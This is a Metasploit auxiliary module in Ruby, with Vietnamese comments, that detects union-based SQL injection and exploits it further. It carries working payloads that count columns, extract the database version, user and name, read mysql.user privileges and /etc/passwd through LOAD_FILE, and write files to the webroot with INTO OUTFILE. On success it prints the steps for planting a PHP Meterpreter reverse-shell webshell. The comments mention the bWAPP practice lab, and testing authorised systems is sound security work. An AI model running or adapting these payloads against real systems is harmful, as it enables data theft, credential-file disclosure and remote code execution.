##
# Enhanced Union-Based SQL Injection Scanner with File Write Check
# Author: Enhanced Version
# License: MSF_LICENSE
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HTTP Union-based SQL Injection Scanner (Enhanced with File Write Check)',
      'Description'    => %q{
        Enhanced version with capabilities to:
        - Detect Union-based SQL injection
        - Check file write permissions (FILE privilege)
        - Check secure_file_priv status
        - Verify webroot path
        - Test actual file write capability
      },
      'Author'         => ['Your Name', 'Enhanced'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://owasp.org/www-community/attacks/SQL_Injection']
        ]
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI to test', '/']),
      OptString.new('METHOD', [true, 'HTTP Method (GET/POST)', 'GET']),
      OptString.new('PARAMS', [false, 'Parameters to test (comma-separated)', '']),
      OptString.new('COOKIE', [false, 'Cookie header for authentication', '']),
      OptString.new('EXTRA_PARAMS', [false, 'Additional fixed parameters (e.g., Submit=Submit)', '']),
      OptInt.new('COLUMNS', [true, 'Maximum number of columns to test', 20]),
      OptString.new('DBMS', [false, 'Target DBMS (MySQL/MSSQL/PostgreSQL/Oracle)', 'MySQL']),
      OptEnum.new('INJECTION_TYPE', [true, 'Injection context type', 'string', ['numeric', 'string']]),
      OptBool.new('CHECK_FILE_PRIV', [true, 'Check FILE privilege', true]),
      OptBool.new('CHECK_SECURE_FILE_PRIV', [true, 'Check secure_file_priv setting', true]),
      OptBool.new('CHECK_WEBROOT', [true, 'Attempt to detect webroot path', true]),
      OptBool.new('TEST_FILE_WRITE', [false, 'Test actual file write (creates test file)', false]),
      OptString.new('TEST_WEBROOT', [false, 'Specific webroot path to test', '']),
      OptBool.new('VERBOSE', [false, 'Enable verbose output', false])
    ])
  end

  # Hàm chính chạy cho mỗi host target
  # ip: IP address của target
  def run_host(ip)
    # Chuẩn hóa URI (thêm / đầu, remove duplicate /)
    uri = normalize_uri(target_uri.path)
    # Lấy HTTP method (GET/POST) và convert sang chữ hoa
    method = datastore['METHOD'].upcase
    
    print_status("=" * 80)
    print_status("🔍 Enhanced Union-Based SQL Injection Scanner with File Write Check")
    print_status("=" * 80)
    print_status("Target: #{ip}:#{rport} - #{uri}")
    print_status("VHOST: #{datastore['VHOST']}") if datastore['VHOST']
    print_status("=" * 80)
    print_status("")
    
    # Get parameters to test
    params = get_test_params
    
    if params.empty?
      print_error("No parameters to test")
      return
    end
    
    params.each do |param|
      print_status("=" * 80)
      print_status("📌 Testing parameter: #{param}")
      print_status("=" * 80)
      test_union_injection(uri, method, param)
      print_status("")
    end
  end

  # Lấy danh sách parameters cần test
  # Return: Array các tên parameter
  def get_test_params
    # Nếu user set PARAMS option
    if datastore['PARAMS'] && !datastore['PARAMS'].empty?
      # Split bằng dấu phẩy và trim khoảng trắng
      # Ví dụ: "id, name , email" → ["id", "name", "email"]
      return datastore['PARAMS'].split(',').map(&:strip)
    else
      # Dùng list parameters mặc định
      return ['id', 'page', 'item', 'user', 'cat', 'category', 'title']
    end
  end

  # Hàm test Union-based SQL Injection cho 1 parameter
  # uri: Đường dẫn URI (vd: /sqli_1.php)
  # method: HTTP method (GET/POST)
  # param: Tên parameter cần test (vd: id)
  def test_union_injection(uri, method, param)
    # Bước 1: Test kết nối với giá trị bình thường
    test_response = send_request(uri, method, param, "1")
    
    unless test_response && test_response.code == 200
      print_error("Could not connect or parameter not working")
      return
    end
    
    print_good("✓ Connection successful (Status: #{test_response.code}, Size: #{test_response.body.length} bytes)")
    
    # Step 2: Find number of columns
    print_status("\n🔢 Step 1: Detecting column count...")
    num_columns = detect_column_count(uri, method, param)
    
    if num_columns.nil?
      print_error("✗ Could not determine column count")
      return
    end
    
    print_good("✓ Found #{num_columns} columns")
    
    # Step 3: Find injectable columns
    print_status("\n💉 Step 2: Finding injectable columns...")
    injectable = find_injectable_columns(uri, method, param, num_columns)
    
    if injectable.empty?
      print_error("✗ No injectable columns found")
      return
    end
    
    print_good("✓ Injectable columns: #{injectable.join(', ')}")
    
    # Step 4: Extract basic info
    print_status("\n📊 Step 3: Extracting database information...")
    db_info = extract_database_info(uri, method, param, num_columns, injectable.first)
    
    # Step 5: Check file write capabilities (MySQL specific)
    if datastore['DBMS'] == 'MySQL' && (datastore['CHECK_FILE_PRIV'] || datastore['CHECK_SECURE_FILE_PRIV'])
      print_status("\n🔐 Step 4: Checking file write capabilities...")
      check_file_write_conditions(uri, method, param, num_columns, injectable.first, db_info)
    end
    
    # Report vulnerability
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'Union-based SQL Injection',
      info: "Parameter '#{param}' vulnerable at #{uri}. Columns: #{num_columns}, Injectable: #{injectable.join(',')}",
      refs: references
    )
  end

  # Phát hiện số lượng cột trong SQL query bằng ORDER BY hoặc UNION SELECT
  # Return: Số cột (Integer) hoặc nil nếu không tìm thấy
  def detect_column_count(uri, method, param)
    # Gửi request baseline để so sánh
    baseline = send_request(uri, method, param, "1")
    return nil unless baseline
    
    # Lưu độ dài response baseline
    baseline_length = baseline.body.length
    # Xác định prefix: String context cần quote (1'), Numeric không cần (1)
    prefix = datastore['INJECTION_TYPE'] == 'string' ? "1' " : "1 "
    
    # Kỹ thuật 1: Test bằng ORDER BY
    # Logic: ORDER BY 1, 2, 3... cho đến khi gặp error → số cột = số trước đó
    vprint_status("Testing with ORDER BY technique...")
    (1..datastore['COLUMNS']).each do |cols|
      # Payload: id=1' ORDER BY 1-- -, id=1' ORDER BY 2-- -, ...
      payload = "#{prefix}ORDER BY #{cols}-- -"
      response = send_request(uri, method, param, payload)
      
      # Skip nếu request fail
      next unless response
      
      # Nếu có SQL error HOẶC response ngắn hơn 50% baseline
      if is_error_response?(response) || (response.body.length < baseline_length * 0.5)
        # Số cột = cols - 1 (vì cols hiện tại gây error)
        return cols - 1 if cols > 1
        return nil  # Nếu cols=1 mà lỗi → syntax error, không phải column count
      end
    end
    
    # Kỹ thuật 2: Test bằng UNION SELECT (fallback nếu ORDER BY fail)
    # Logic: UNION SELECT NULL,NULL,... cho đến khi không có error
    vprint_status("ORDER BY failed, trying UNION SELECT...")
    (1..datastore['COLUMNS']).each do |cols|
      # Tạo chuỗi NULL,NULL,... theo số cột
      # Ví dụ: cols=3 → "NULL,NULL,NULL"
      nulls = Array.new(cols, 'NULL').join(',')
      
      if datastore['INJECTION_TYPE'] == 'string'
        # String context: id=-1' UNION SELECT NULL,NULL,NULL-- -
        payload = "-1' UNION SELECT #{nulls}-- -"
      else
        # Numeric context: id=-1 UNION SELECT NULL,NULL,NULL-- -
        payload = "-1 UNION SELECT #{nulls}-- -"
      end
      
      response = send_request(uri, method, param, payload)
      next unless response
      
      # Nếu KHÔNG có error VÀ status = 200 → Tìm thấy số cột
      if !is_error_response?(response) && response.code == 200
        return cols
      end
    end
    
    nil
  end

  # Tìm các cột có thể inject và hiển thị data
  # num_columns: Số cột đã detect được
  # Return: Array các vị trí cột injectable (vd: [2, 4])
  def find_injectable_columns(uri, method, param, num_columns)
    injectable = []  # Array lưu kết quả
    
    # Test từng cột
    (1..num_columns).each do |pos|
      # Tạo marker random để phát hiện (vd: "MSF47832")
      marker = "MSF#{rand(10000..99999)}"
      # Tạo array NULL cho tất cả cột
      cols = Array.new(num_columns, 'NULL')
      # Thay cột đang test bằng marker
      # pos=1 → cols[0], pos=2 → cols[1] (vì index từ 0)
      cols[pos - 1] = "'#{marker}'"
      
      if datastore['INJECTION_TYPE'] == 'string'
        payload = "-1' UNION SELECT #{cols.join(',')}-- -"
      else
        payload = "-1 UNION SELECT #{cols.join(',')}-- -"
      end
      
      response = send_request(uri, method, param, payload)
      next unless response
      
      # Nếu marker xuất hiện trong response → Cột này injectable
      if response.body.include?(marker)
        injectable << pos  # Append vào array kết quả
        vprint_good("Column #{pos} is injectable")
      end
    end
    
    # Return array các cột injectable (vd: [2, 4, 5])
    injectable
  end

  # Trích xuất thông tin cơ bản từ database
  # injectable_col: Cột có thể inject (đã tìm thấy từ find_injectable_columns)
  # Return: Hash chứa thông tin {version: "...", database: "...", user: "..."}
  def extract_database_info(uri, method, param, num_columns, injectable_col)
    info = {}  # Hash lưu kết quả
    
    # Trích xuất version MySQL (VERSION())
    version = extract_single_value(uri, method, param, num_columns, injectable_col, 'VERSION()')
    if version
      info[:version] = version  # Lưu vào hash với symbol key
      print_good("  🗄️  Database Version: #{version}")
    end
    
    # Trích xuất tên database hiện tại (DATABASE())
    db_name = extract_single_value(uri, method, param, num_columns, injectable_col, 'DATABASE()')
    if db_name
      info[:database] = db_name
      print_good("  📦 Database Name: #{db_name}")
    end
    
    # Trích xuất current user (USER())
    user = extract_single_value(uri, method, param, num_columns, injectable_col, 'USER()')
    if user
      info[:user] = user  # Format: user@hostname (vd: root@localhost)
      print_good("  👤 Current User: #{user}")
    end
    
    # Return hash chứa tất cả thông tin
    info
  end

  # Kiểm tra điều kiện ghi file (FILE privilege, secure_file_priv, webroot)
  # db_info: Hash chứa thông tin database (từ extract_database_info)
  # Return: Hash kết quả kiểm tra
  def check_file_write_conditions(uri, method, param, num_columns, injectable_col, db_info)
    # Hash lưu kết quả các bước kiểm tra
    results = {
      file_priv: false,        # User có FILE privilege?
      secure_file_priv: nil,   # Giá trị secure_file_priv
      webroot: nil,            # Đường dẫn webroot detect được
      can_write: false         # Test ghi file thực tế có thành công?
    }
    
    # Check FILE privilege
    if datastore['CHECK_FILE_PRIV']
      print_status("\n  🔍 Checking FILE privilege...")
      file_priv = check_file_privilege(uri, method, param, num_columns, injectable_col, db_info[:user])
      results[:file_priv] = file_priv
      
      if file_priv
        print_good("  ✅ FILE Privilege: ENABLED")
      else
        print_error("  ❌ FILE Privilege: DISABLED")
        print_error("     User does not have FILE privilege - cannot write files!")
        return results
      end
    end
    
    # Check secure_file_priv
    if datastore['CHECK_SECURE_FILE_PRIV']
      print_status("\n  🔍 Checking secure_file_priv setting...")
      secure_file_priv = check_secure_file_priv(uri, method, param, num_columns, injectable_col)
      results[:secure_file_priv] = secure_file_priv
      
      if secure_file_priv.nil? || secure_file_priv.empty?
        print_good("  ✅ secure_file_priv: EMPTY (can write anywhere!)")
      elsif secure_file_priv == "NULL"
        print_good("  ✅ secure_file_priv: NULL (can write anywhere!)")
      else
        print_warning("  ⚠️  secure_file_priv: #{secure_file_priv}")
        print_warning("     Can only write to: #{secure_file_priv}")
      end
    end
    
    # Detect webroot
    if datastore['CHECK_WEBROOT']
      print_status("\n  🔍 Attempting to detect webroot path...")
      webroot = detect_webroot(uri, method, param, num_columns, injectable_col)
      results[:webroot] = webroot
      
      if webroot
        print_good("  ✅ Potential webroot: #{webroot}")
      else
        print_warning("  ⚠️  Could not auto-detect webroot")
      end
    end
    
    # Test actual file write
    if datastore['TEST_FILE_WRITE'] && results[:file_priv]
      print_status("\n  🔍 Testing actual file write capability...")
      test_path = datastore['TEST_WEBROOT']
      test_path = results[:webroot] if test_path.empty? && results[:webroot]
      
      if test_path && !test_path.empty?
        can_write = test_file_write(uri, method, param, num_columns, injectable_col, test_path)
        results[:can_write] = can_write
        
        if can_write
          print_good("  ✅ File write test: SUCCESS")
          print_good("     You can write files to: #{test_path}")
        else
          print_error("  ❌ File write test: FAILED")
        end
      else
        print_warning("  ⚠️  Skipping file write test - no webroot path available")
        print_warning("     Set TEST_WEBROOT to test specific path")
      end
    end
    
    # Summary
    print_status("\n" + "=" * 80)
    print_status("📋 FILE WRITE CAPABILITY SUMMARY")
    print_status("=" * 80)
    print_status("FILE Privilege:      #{results[:file_priv] ? '✅ YES' : '❌ NO'}")
    print_status("secure_file_priv:    #{results[:secure_file_priv] || 'EMPTY (✅ Good)'}")
    print_status("Detected Webroot:    #{results[:webroot] || 'Unknown'}")
    print_status("Can Write Files:     #{results[:can_write] ? '✅ YES' : '⚠️  Not Tested'}")
    print_status("=" * 80)
    
    if results[:file_priv] && (results[:secure_file_priv].nil? || results[:secure_file_priv].empty? || results[:secure_file_priv] == "NULL")
      print_good("\n🎉 EXCELLENT! This server is vulnerable to file write attacks!")
      print_good("Next steps:")
      print_good("  1. Create PHP Meterpreter payload: msfvenom -p php/meterpreter/reverse_tcp ...")
      print_good("  2. Convert to hex: xxd -p shell.php | tr -d '\\n'")
      print_good("  3. Use INTO OUTFILE to write: UNION SELECT ... INTO OUTFILE '#{results[:webroot] || '/var/www/html'}/shell.php'")
    end
    
    results
  end

  # Kiểm tra xem user có FILE privilege không
  # current_user: Username format "user@hostname" (vd: "root@localhost")
  # Return: true nếu có privilege, false nếu không
  def check_file_privilege(uri, method, param, num_columns, injectable_col, current_user)
    # Tách username từ "root@localhost" → "root"
    # Dùng ternary: nếu current_user nil → username = nil
    username = current_user ? current_user.split('@').first : nil
    
    if username.nil?
      print_warning("  Could not determine username, trying generic check...")
      # Không có username → Query generic (lấy 1 record bất kỳ)
      query = "SELECT File_priv FROM mysql.user LIMIT 1"
    else
      # Có username → Query cụ thể cho user đó
      # Ví dụ: SELECT File_priv FROM mysql.user WHERE user='root'
      query = "SELECT File_priv FROM mysql.user WHERE user='#{username}'"
    end
    
    # Thực thi query để lấy File_priv
    result = extract_single_value(uri, method, param, num_columns, injectable_col, query)
    
    if result
      vprint_status("  File_priv value: #{result}")
      # File_priv = 'Y' nghĩa là có quyền, 'N' là không có
      # Convert sang uppercase để so sánh (có thể là 'y' hoặc 'Y')
      return result.upcase == 'Y'
    end
    
    # Phương pháp alternative: Thử đọc file /etc/passwd
    # Nếu đọc được → có FILE privilege
    test_result = extract_single_value(uri, method, param, num_columns, injectable_col, "LOAD_FILE('/etc/passwd')")
    return !test_result.nil? && !test_result.empty?
  end

  # Kiểm tra giá trị secure_file_priv (giới hạn thư mục ghi file)
  # Return: 
  #   - NULL hoặc empty → Có thể ghi bất kỳ đâu
  #   - "/var/www/html" → Chỉ ghi được vào thư mục này
  def check_secure_file_priv(uri, method, param, num_columns, injectable_col)
    # Phương pháp 1: Query biến global
    result = extract_single_value(uri, method, param, num_columns, injectable_col, '@@global.secure_file_priv')
    
    if result
      return result
    end
    
    # Phương pháp 2: Query từ information_schema (fallback)
    result = extract_single_value(uri, method, param, num_columns, injectable_col, 
      "SELECT variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'")
    
    # Implicit return
    result
  end

  # Phát hiện webroot path (thư mục chứa source code web)
  # Return: Đường dẫn webroot hoặc '/var/www/html' (default)
  def detect_webroot(uri, method, param, num_columns, injectable_col)
    # Danh sách các webroot path phổ biến
    common_paths = [
      '/var/www/html',          # Apache/Ubuntu default
      '/var/www',               # Apache alternative
      '/usr/share/nginx/html',  # Nginx default
      '/app',                   # Docker bWAPP
      '/srv/www',               # SUSE Linux
      '/home/www',              # Custom setup
      '/opt/lampp/htdocs'       # XAMPP Linux
    ]
    
    # Thử detect từ MySQL basedir (optional)
    script_path = extract_single_value(uri, method, param, num_columns, injectable_col, '@@basedir')
    vprint_status("  Base directory: #{script_path}") if script_path
    
    # Test từng path bằng cách thử đọc index.php
    common_paths.each do |path|
      # Dùng LOAD_FILE để đọc file
      # Nếu đọc được → path tồn tại và có quyền đọc
      test = extract_single_value(uri, method, param, num_columns, injectable_col, "LOAD_FILE('#{path}/index.php')")
      if test && !test.empty?
        return path  # Tìm thấy webroot
      end
    end
    
    # Không tìm thấy → Return path phổ biến nhất làm default
    '/var/www/html'
  end

# Test khả năng ghi file thực tế vào webroot
# Return: true nếu ghi thành công, false nếu thất bại
def test_file_write(uri, method, param, num_columns, injectable_col, webroot)
  print_status("  Testing file write with multiple paths...")
  
  # Danh sách đường dẫn để test (theo thứ tự ưu tiên)
  test_paths = [
    "/tmp",                    # Luôn có quyền ghi (để test cơ bản)
    webroot,                   # Webroot đã detect được
    "/var/www/html",          # Default Apache
    "/app",                    # Docker bWAPP
    "/usr/share/nginx/html"   # Nginx
  ].uniq.compact  # Remove duplicates và nil values
  
  # Tạo tên file random (vd: msf_test_47832.txt)
  test_filename = "msf_test_#{rand(10000..99999)}.txt"
  # Nội dung test với timestamp (vd: MSF_TEST_1701619200)
  test_content = "MSF_TEST_#{Time.now.to_i}"
  
  # Test từng path
  test_paths.each do |base_path|
    # Full path: /var/www/html/msf_test_47832.txt
    test_path = "#{base_path}/#{test_filename}"
    
    print_status("    Trying: #{test_path}")
    
    # Build UNION SELECT payload để ghi file
    cols = Array.new(num_columns, 'NULL')  # Tạo array NULL
    cols[injectable_col - 1] = "'#{test_content}'"  # Thay cột injectable bằng nội dung
    
    # Tạo payload tùy theo injection type
    if datastore['INJECTION_TYPE'] == 'string'
      # String: id=-1' UNION SELECT NULL,'content',NULL INTO OUTFILE '/path/file.txt'-- -
      payload = "-1' UNION SELECT #{cols.join(',')} INTO OUTFILE '#{test_path}'-- -"
    else
      # Numeric: id=-1 UNION SELECT NULL,'content',NULL INTO OUTFILE '/path/file.txt'-- -
      payload = "-1 UNION SELECT #{cols.join(',')} INTO OUTFILE '#{test_path}'-- -"
    end
    
    # Gửi request để ghi file
    response = send_request(uri, method, param, payload)
    
    # Guard clause: Request thất bại
    unless response
      print_error("      Request failed")
      next  # Skip path này, thử path tiếp theo
    end
    
    # Kiểm tra các loại SQL error
    if is_error_response?(response)
      if response.body =~ /File '.*' already exists/i
        # File đã tồn tại từ lần test trước
        print_warning("      File already exists (from previous test)")
        next
      elsif response.body =~ /Access denied/i
        # Không có quyền ghi vào path này
        print_error("      Access denied to path")
        next
      elsif response.body =~ /No such file or directory/i
        # Thư mục không tồn tại
        print_error("      Directory doesn't exist")
        next
      else
        # SQL error khác
        print_error("      SQL error: #{response.body[0..200]}")
        next
      end
    end
    
    # Đợi file system flush (0.5 giây)
    sleep(0.5)
    
    # Verify bằng cách đọc lại file vừa ghi
    verify_content = extract_single_value(uri, method, param, num_columns, injectable_col, "LOAD_FILE('#{test_path}')")
    
    # Kiểm tra nội dung đọc được có chứa test_content không
    if verify_content && verify_content.include?(test_content)
      print_good("      ✅ SUCCESS! File written and verified")
      print_good("      Location: #{test_path}")
      
      # Nếu ghi vào webroot (không phải /tmp), test truy cập qua HTTP
      if base_path != "/tmp"
        sleep(0.5)
        test_uri = "/#{test_filename}"  # Ví dụ: /msf_test_47832.txt
        begin
          # Gửi GET request để test truy cập file
          http_response = send_request_cgi({
            'uri' => test_uri,
            'method' => 'GET',
            'headers' => { 'Host' => datastore['VHOST'] }
          })
          
          # Kiểm tra file có accessible qua HTTP không
          if http_response && http_response.code == 200 && http_response.body.include?(test_content)
            print_good("      ✅ File accessible via HTTP!")
            print_good("      URL: http://#{datastore['VHOST'] || rhost}#{test_uri}")
          end
        rescue => e
          # Exception handling cho HTTP request
          vprint_error("      HTTP test failed: #{e.message}")
        end
      end
      
      return true  # File write thành công
    else
      print_error("      Could not verify file (write may have failed)")
    end
  end
  
  false
end  


  # Trích xuất 1 giá trị từ database bằng UNION SELECT
  # query: SQL expression cần extract (vd: 'VERSION()', 'DATABASE()', 'USER()')
  # Return: String value hoặc nil nếu không tìm thấy
  def extract_single_value(uri, method, param, num_columns, injectable_col, query)
    # Tạo array NULL cho tất cả cột
    cols = Array.new(num_columns, 'NULL')
    # Thay cột injectable bằng query cần extract
    cols[injectable_col - 1] = query
    
    # Build payload UNION SELECT
    if datastore['INJECTION_TYPE'] == 'string'
      # String: id=-1' UNION SELECT NULL,VERSION(),NULL-- -
      payload = "-1' UNION SELECT #{cols.join(',')}-- -"
    else
      # Numeric: id=-1 UNION SELECT NULL,VERSION(),NULL-- -
      payload = "-1 UNION SELECT #{cols.join(',')}-- -"
    end
    
    response = send_request(uri, method, param, payload)
    return nil unless response  # Guard clause
    
    # Thử extract data từ response bằng nhiều pattern
    
    # Pattern 1: bWAPP specific format
    # Tìm: "<br />First name: 5.7.33-log<br"
    # $1 = captured group (giá trị giữa 2 tags)
    if response.body =~ /<br \/>First name: ([^<]+)<br/m
      return $1.strip  # Strip whitespace
    end
    
    # Pattern 2: Generic marker (nếu có custom marker)
    # Tìm: "MSF_EXTRACT_START5.7.33MSF_EXTRACT_END"
    if response.body =~ /MSF_EXTRACT_START(.+?)MSF_EXTRACT_END/m
      return $1.strip
    end
    
    # Pattern 3: HTML table cell
    # Tìm: "<td>5.7.33-log</td>" hoặc "<td class='data'>5.7.33</td>"
    if response.body =~ /<td[^>]*>([^<]+)<\/td>/m
      value = $1.strip
      # Loại bỏ giá trị 'NULL' (SQL NULL string, không phải data thật)
      return value unless value == 'NULL' || value.empty?
    end
    
    # Không tìm thấy → return nil (explicit)
    nil
  end

  # Gửi HTTP request với parameter được inject
  # param: Tên parameter (vd: "id")
  # value: Giá trị inject (vd: "1' ORDER BY 1-- -")
  # Return: Response object hoặc nil nếu error
  def send_request(uri, method, param, value)
    # Hash options cho request
    opts = {
      'uri'    => uri,
      'method' => method
    }
    
    # Thêm Cookie header nếu có (cho authentication)
    if datastore['COOKIE'] && !datastore['COOKIE'].empty?
      opts['headers'] = { 'Cookie' => datastore['COOKIE'] }
    end
    
    # Thêm Host header nếu có VHOST (virtual host)
    if datastore['VHOST'] && !datastore['VHOST'].empty?
      opts['headers'] ||= {}  # Initialize nếu chưa có
      opts['headers']['Host'] = datastore['VHOST']
    end
    
    # Setup GET parameters
    if method == 'GET'
      # Main parameter với giá trị inject
      opts['vars_get'] = { param => value }
      
      # Merge thêm parameters khác nếu có (vd: Submit=Submit)
      if datastore['EXTRA_PARAMS'] && !datastore['EXTRA_PARAMS'].empty?
        opts['vars_get'].merge!(parse_extra_params(datastore['EXTRA_PARAMS']))
      end
    else
      # Setup POST parameters (tương tự GET)
      opts['vars_post'] = { param => value }
      
      if datastore['EXTRA_PARAMS'] && !datastore['EXTRA_PARAMS'].empty?
        opts['vars_post'].merge!(parse_extra_params(datastore['EXTRA_PARAMS']))
      end
    end
    
    # Exception handling cho request
    begin
      send_request_cgi(opts)  # Metasploit method gửi HTTP request
    rescue => e
      # Catch mọi exception và return nil
      vprint_error("Request error: #{e.message}")
      nil
    end
  end
  
  # Parse string parameters thành hash
  # Input: "Submit=Submit&action=search"
  # Output: {"Submit" => "Submit", "action" => "search"}
  def parse_extra_params(params_string)
    params = {}  # Hash kết quả
    # Split bằng & → ["Submit=Submit", "action=search"]
    params_string.split('&').each do |pair|
      # Split bằng = → ["Submit", "Submit"]
      # Limit 2: Chỉ split lần đầu (handle value có dấu =)
      key, val = pair.split('=', 2)
      params[key] = val if key  # Chỉ add nếu có key
    end
    params
  end

  # Kiểm tra response có phải SQL error không
  # Return: true nếu có error, false nếu không
  def is_error_response?(response)
    # HTTP 5xx = Server error
    return true if response.code >= 500
    
    # Array các regex pattern để detect SQL error
    error_patterns = [
      /SQL syntax/i,                      # MySQL syntax error
      /mysql_fetch/i,                     # MySQL fetch error
      /ORA-\d{5}/i,                       # Oracle error (ORA-12345)
      /PostgreSQL.*ERROR/i,               # PostgreSQL error
      /Microsoft SQL Server/i,            # MSSQL error
      /ODBC.*Driver/i,                    # ODBC driver error
      /SQLite.*error/i,                   # SQLite error
      /Unknown column/i,                  # Column không tồn tại
      /ERROR:/i,                          # Generic ERROR:
      /Warning.*mysql/i,                  # MySQL warning
      /valid MySQL result/i,              # Invalid MySQL result
      /MySqlClient\./i,                   # MySqlClient error
      /supplied argument is not a valid MySQL/i  # PHP MySQL error
    ]
    
    # Check nếu BẤT KỲ pattern nào match với response body
    # .any? return true nếu ít nhất 1 element thỏa điều kiện
    error_patterns.any? { |pattern| response.body =~ pattern }
  end
  
  # Verbose print methods - Chỉ in khi VERBOSE = true
  
  # Print status message (màu xanh)
  def vprint_status(msg)
    print_status(msg) if datastore['VERBOSE']
  end
  
  # Print success message (màu xanh lá)
  def vprint_good(msg)
    print_good(msg) if datastore['VERBOSE']
  end
  
  # Print error message (màu đỏ)
  def vprint_error(msg)
    print_error(msg) if datastore['VERBOSE']
  end
  
  # Print warning message (màu vàng)
  def vprint_warning(msg)
    print_warning(msg) if datastore['VERBOSE']
  end
end
          
